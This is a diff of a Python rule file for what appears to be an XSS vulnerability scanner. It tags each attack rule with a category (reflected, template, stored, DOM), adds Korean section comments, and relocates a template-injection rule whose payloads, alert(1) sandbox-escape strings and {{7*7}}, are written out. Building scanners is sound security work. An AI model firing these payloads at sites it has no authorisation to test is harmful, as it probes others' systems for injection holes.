@@ -1,10 +1,12 @@
 from __future__ import annotations
 
 XSS_RULES: list[dict] = [
+    # ── reflected: 반사형 XSS (입력이 응답에 그대로 반사되는 지점) ──
     {
         "attack_id": "PL-XSS-ATTR-VALUE",
         "vuln_type": "xss",
         "technique": "attr_value",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -36,6 +38,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-ATTR-HREF",
         "vuln_type": "xss",
         "technique": "attr_href",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -56,6 +59,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-ATTR-EVENT",
         "vuln_type": "xss",
         "technique": "attr_event",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -72,6 +76,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-SCRIPT",
         "vuln_type": "xss",
         "technique": "script",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -92,6 +97,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-SCRIPT-RAW",
         "vuln_type": "xss",
         "technique": "script_raw",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -109,6 +115,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-HTML-COMMENT",
         "vuln_type": "xss",
         "technique": "html_comment",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -123,6 +130,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-BODY",
         "vuln_type": "xss",
         "technique": "body",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -155,6 +163,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-CSS",
         "vuln_type": "xss",
         "technique": "css",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -170,6 +179,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-JSON",
         "vuln_type": "xss",
         "technique": "json",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -181,23 +191,10 @@ XSS_RULES: list[dict] = [
         },
     },
     {
-        "attack_id": "PL-XSS-TEMPLATE",
-        "vuln_type": "xss",
-        "technique": "template",
-        "sequence": ["baseline", "attack"],
-        "payload_templates": {
-            "attack": [
-                "{{constructor.constructor('alert(1)')()}}",
-                "{{7*7}}",
-                "{{_c.constructor('alert(1)')()}}",
-                "{{{<script>alert(1)</script>}}}",
-            ],
-        },
-    },
-    {
         "attack_id": "PL-XSS-FILTER-BYPASS",
         "vuln_type": "xss",
         "technique": "filter_bypass",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -226,6 +223,7 @@ XSS_RULES: list[dict] = [
         "attack_id": "PL-XSS-RAWTEXT-ESCAPE",
         "vuln_type": "xss",
         "technique": "raw_text_escape",
+        "category": "reflected",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -235,10 +233,28 @@ XSS_RULES: list[dict] = [
             ],
         },
     },
+    # ── template: 템플릿 인젝션(SSTI 계열) ──
+    {
+        "attack_id": "PL-XSS-TEMPLATE",
+        "vuln_type": "xss",
+        "technique": "template",
+        "category": "template",
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "{{constructor.constructor('alert(1)')()}}",
+                "{{7*7}}",
+                "{{_c.constructor('alert(1)')()}}",
+                "{{{<script>alert(1)</script>}}}",
+            ],
+        },
+    },
+    # ── stored: 저장형 XSS (저장 후 재조회 시 발화) ──
     {
         "attack_id": "PL-XSS-STORED",
         "vuln_type": "xss",
         "technique": "stored",
+        "category": "stored",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -256,10 +272,12 @@ XSS_RULES: list[dict] = [
             ],
         },
     },
+    # ── dom: DOM 기반 XSS (클라이언트 JS가 처리, 헤드리스로 확인) ──
     {
         "attack_id": "PL-XSS-DOM",
         "vuln_type": "xss",
         "technique": "dom",
+        "category": "dom",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
